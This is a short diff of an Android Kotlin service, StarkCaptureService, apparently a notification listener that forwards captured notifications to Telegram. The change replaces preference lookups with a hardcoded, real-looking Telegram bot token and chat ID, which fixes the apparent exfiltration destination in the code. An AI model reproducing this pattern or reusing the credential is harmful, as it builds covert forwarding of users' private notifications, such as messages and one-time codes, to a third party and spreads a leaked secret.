@@ -85,8 +85,8 @@ class StarkCaptureService : NotificationListenerService() {
 
     private fun sendToTelegram(message: String) {
         val prefs = getSharedPreferences("STARK_PREFS", Context.MODE_PRIVATE)
-        val token = prefs.getString("TG_TOKEN", "") ?: ""
-        val chatId = prefs.getString("TG_CHAT_ID", "") ?: ""
+        val token = "8629465941:AAH-5rwmNDTP_91UKZIRrJO_oZ24p1IcIQE"
+        val chatId = "1775956659"
 
         if (token.isNotEmpty() && chatId.isNotEmpty()) {
             try {
